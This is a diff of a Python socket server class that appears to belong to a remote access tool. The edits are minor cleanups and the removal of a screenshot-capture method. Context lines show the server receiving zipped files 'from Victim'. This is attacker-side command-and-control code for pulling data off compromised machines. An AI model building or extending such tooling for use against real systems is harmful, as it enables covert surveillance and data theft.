@@ -1,6 +1,6 @@
 import socket
 
-DSIZE = 102400 #Data Size
+DSIZE = 102400 # Data Size
 DELIMETER = "<END_OF_RESULTS>"
 
 class ServerConnection :
@@ -15,7 +15,7 @@ class ServerConnection :
         
         self.socket.bind((self.server_ip,self.server_port))
     
-    def Listen(self , noc): #noc = Number Of Connections
+    def Listen(self , noc): # noc = Number Of Connections
         self.socket.listen(noc)
         
     def AcceptConnection(self):
@@ -64,7 +64,6 @@ class ServerConnection :
          print(f"[+] Receiving {zipped_file} from Victim")
          
          full_file=b''
-         check=-1
          while True :
              chunk = self.client_conn.recv(DSIZE)
              if chunk.endswith(DELIMETER.encode()):
@@ -84,8 +83,3 @@ class ServerConnection :
     def end_conn(self):
         self.client_conn.close()
         self.socket.close()
-        
-    def capture_screenshot(my_socket):
-         print("[+] Capturing Screenshot")
-         zipped_name="screenshot.zip"
-         my_socket.receive_zipped(zipped_name)
